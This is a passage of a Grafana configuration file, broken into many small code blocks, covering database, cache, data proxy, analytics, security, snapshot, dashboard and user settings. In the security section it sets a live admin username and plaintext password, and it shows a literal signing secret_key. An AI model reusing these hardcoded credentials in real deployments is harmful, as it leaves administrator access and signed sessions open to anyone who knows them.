```
```text
# For "mysql" use "READ-UNCOMMITTED", "READ-COMMITTED", "REPEATABLE-READ" or "SERIALIZABLE".
;isolation_level =

;ca_cert_path =
;client_key_path =
;client_cert_path =
;server_cert_name =
```
```text
# For "sqlite3" only, path relative to data_path setting
;path = grafana.db
```
```text
# Max idle conn setting default is 2
;max_idle_conn = 2
```
```text
# Max conn setting default is 0 (mean not set)
;max_open_conn =
```
```text
# Connection Max Lifetime default is 14400 (means 14400 seconds or 4 hours)
;conn_max_lifetime = 14400
```
```text
# Set to true to log the sql calls and execution times.
;log_queries =
```
```text
# For "sqlite3" only. cache mode setting used for connecting to the database. (private, shared)
;cache_mode = private

################################### Data sources #########################
[datasources]
```
```text
# Upper limit of data sources that Grafana will return. This limit is a temporary configuration and it will be deprecated when pagination will be introduced on the list data sources API.
;datasource_limit = 5000

#################################### Cache server #############################
[remote_cache]
```
```text
# Either "redis", "memcached" or "database" default is "database"
;type = database
```
```text
# cache connectionstring options
```
```text
# database: will use Grafana primary database.
```
```text
# redis: config like redis server e.g. `addr=127.0.0.1:6379,pool_size=100,db=0,ssl=false`. Only addr is required. ssl may be 'true', 'false', or 'insecure'.
```
```text
# memcache: 127.0.0.1:11211
;connstr =

#################################### Data proxy ###########################
[dataproxy]
```
```text
# This enables data proxy logging, default is false
;logging = false
```
```text
# How long the data proxy waits to read the headers of the response before timing out, default is 30 seconds.
```
```text
# This setting also applies to core backend HTTP data sources where query requests use an HTTP client with timeout set.
;timeout = 30
```
```text
# How long the data proxy waits to establish a TCP connection before timing out, default is 10 seconds.
;dialTimeout = 10
```
```text
# How many seconds the data proxy waits before sending a keepalive probe request.
;keep_alive_seconds = 30
```
```text
# How many seconds the data proxy waits for a successful TLS Handshake before timing out.
;tls_handshake_timeout_seconds = 10
```
```text
# How many seconds the data proxy will wait for a server's first response headers after
```
```text
# fully writing the request headers if the request has an "Expect: 100-continue"
```
```text
# header. A value of 0 will result in the body being sent immediately, without
```
```text
# waiting for the server to approve.
;expect_continue_timeout_seconds = 1
```
```text
# Optionally limits the total number of connections per host, including connections in the dialing,
```
```text
# active, and idle states. On limit violation, dials will block.
```
```text
# A value of zero (0) means no limit.
;max_conns_per_host = 0
```
```text
# The maximum number of idle connections that Grafana will keep alive.
;max_idle_connections = 100
```
```text
# How many seconds the data proxy keeps an idle connection open before timing out.
;idle_conn_timeout_seconds = 90
```
```text
# If enabled and user is not anonymous, data proxy will add X-Grafana-User header with username into the request, default is false.
;send_user_header = false
```
```text
# Limit the amount of bytes that will be read/accepted from responses of outgoing HTTP requests.
;response_limit = 0
```
```text
# Limits the number of rows that Grafana will process from SQL data sources.
;row_limit = 1000000

#################################### Analytics ####################################
[analytics]
```
```text
# Server reporting, sends usage counters to stats.grafana.org every 24 hours.
```
```text
# No ip addresses are being tracked, only simple counters to track
```
```text
# running instances, dashboard and error counts. It is very helpful to us.
```
```text
# Change this option to false to disable reporting.
;reporting_enabled = true
```
```text
# The name of the distributor of the Grafana instance. Ex hosted-grafana, grafana-labs
;reporting_distributor = grafana-labs
```
```text
# Set to false to disable all checks to https://grafana.net
```
```text
# for new versions (grafana itself and plugins), check is used
```
```text
# in some UI views to notify that grafana or plugin update exists
```
```text
# This option does not cause any auto updates, nor send any information
```
```text
# only a GET request to http://grafana.com to get latest versions
;check_for_updates = true
```
```text
# Google Analytics universal tracking code, only enabled if you specify an id here
;google_analytics_ua_id =
```
```text
# Google Tag Manager ID, only enabled if you specify an id here
;google_tag_manager_id =

#################################### Security ####################################
[security]
```
```text
# disable creation of admin user on first start of grafana
;disable_initial_admin_creation = false
```
```text
# default admin user, created on startup
admin_user = grafana-admin
```
```text
# default admin password, can be changed before first start of grafana,  or in profile settings
admin_password = GraphingTheWorld32
```
```text
# used for signing
;secret_key = SW2YcwTIb9zpOOhoPsMm
```
```text
# disable gravatar profile images
;disable_gravatar = false
```
```text
# data source proxy whitelist (ip_or_domain:port separated by spaces)
;data_source_proxy_whitelist =
```
```text
# disable protection against brute force login attempts
;disable_brute_force_login_protection = false
```
```text
# set to true if you host Grafana behind HTTPS. default is false.
;cookie_secure = false
```
```text
# set cookie SameSite attribute. defaults to `lax`. can be set to "lax", "strict", "none" and "disabled"
;cookie_samesite = lax
```
```text
# set to true if you want to allow browsers to render Grafana in a <frame>, <iframe>, <embed> or <object>. default is false.
;allow_embedding = false
```
```text
# Set to true if you want to enable http strict transport security (HSTS) response header.
```
```text
# This is only sent when HTTPS is enabled in this configuration.
```
```text
# HSTS tells browsers that the site should only be accessed using HTTPS.
;strict_transport_security = false
```
```text
# Sets how long a browser should cache HSTS. Only applied if strict_transport_security is enabled.
;strict_transport_security_max_age_seconds = 86400
```
```text
# Set to true if to enable HSTS preloading option. Only applied if strict_transport_security is enabled.
;strict_transport_security_preload = false
```
```text
# Set to true if to enable the HSTS includeSubDomains option. Only applied if strict_transport_security is enabled.
;strict_transport_security_subdomains = false
```
```text
# Set to true to enable the X-Content-Type-Options response header.
```
```text
# The X-Content-Type-Options response HTTP header is a marker used by the server to indicate that the MIME types advertised
```
```text
# in the Content-Type headers should not be changed and be followed.
;x_content_type_options = true
```
```text
# Set to true to enable the X-XSS-Protection header, which tells browsers to stop pages from loading
```
```text
# when they detect reflected cross-site scripting (XSS) attacks.
;x_xss_protection = true
```
```text
# Enable adding the Content-Security-Policy header to your requests.
```
```text
# CSP allows to control resources the user agent is allowed to load and helps prevent XSS attacks.
;content_security_policy = false
```
```text
# Set Content Security Policy template used when adding the Content-Security-Policy header to your requests.
```
```text
# $NONCE in the template includes a random nonce.
```
```text
# $ROOT_PATH is server.root_url without the protocol.
;content_security_policy_template = """script-src 'self' 'unsafe-eval' 'unsafe-inline' 'strict-dynamic' $NONCE;object-src 'none';font-src 'self';style-src 'self' 'unsafe-inline' blob:;img-src * data:;base-uri 'self';connect-src 'self' grafana.com ws://$ROOT_PATH wss://$ROOT_PATH;manifest-src 'self';media-src 'none';form-action 'self';"""

#################################### Snapshots ###########################
[snapshots]
```
```text
# snapshot sharing options
;external_enabled = true
;external_snapshot_url = https://snapshots-origin.raintank.io
;external_snapshot_name = Publish to snapshot.raintank.io
```
```text
# Set to true to enable this Grafana instance act as an external snapshot server and allow unauthenticated requests for
```
```text
# creating and deleting snapshots.
;public_mode = false
```
```text
# remove expired snapshot
;snapshot_remove_expired = true

#################################### Dashboards History ##################
[dashboards]
```
```text
# Number dashboard versions to keep (per dashboard). Default: 20, Minimum: 1
;versions_to_keep = 20
```
```text
# Minimum dashboard refresh interval. When set, this will restrict users to set the refresh interval of a dashboard lower than given interval. Per default this is 5 seconds.
```
```text
# The interval string is a possibly signed sequence of decimal numbers, followed by a unit suffix (ms, s, m, h, d), e.g. 30s or 1m.
;min_refresh_interval = 5s
```
```text
# Path to the default home dashboard. If this value is empty, then Grafana uses StaticRootPath + "dashboards/home.json"
;default_home_dashboard_path =

#################################### Users ###############################
[users]
```
```text
# disable user signup / registration
;allow_sign_up = true
```
```text
# Allow non admin users to create organizations
;allow_org_create = true
```
```text
# Set to true to automatically assign new users to the default organization (id 1)
;auto_assign_org = true
```
